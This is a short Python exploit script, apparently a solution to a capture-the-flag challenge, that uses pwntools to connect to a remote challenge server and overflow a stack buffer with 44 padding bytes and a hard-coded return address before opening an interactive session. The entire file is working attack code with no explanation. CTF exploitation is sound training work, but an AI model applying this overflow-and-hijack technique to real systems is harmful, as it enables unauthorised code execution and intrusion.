#!/usr/bin/env python

import struct
from pwn import *

def p(x):
    return struct.pack('<L', x)

ret = p(0x080484ad)
r = remote('pwn.problem.sctf.io', 1337)
r.sendline("A" * 44 + ret)

r.interactive()
